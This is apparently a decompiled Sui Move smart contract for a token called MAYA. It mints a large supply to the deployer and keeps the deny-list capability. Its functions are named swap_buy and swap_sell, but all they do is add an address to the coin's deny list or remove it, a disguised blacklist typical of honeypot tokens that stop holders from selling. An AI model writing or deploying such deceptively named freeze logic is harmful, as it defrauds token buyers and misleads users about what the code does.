module 0x2bf5429d31b5e0a27dabfcdfad6384d33a10e81e529dc0c215fea3ceff23963a::maya {
    struct MAYA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MAYA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MAYA>(arg0, 9, b"MAYA", b"Maya", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZXe69qxDFEnwJqZ76L5Awb4r57okCAZA368o6epjNQjZ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MAYA>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MAYA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MAYA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MAYA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MAYA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MAYA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MAYA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MAYA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

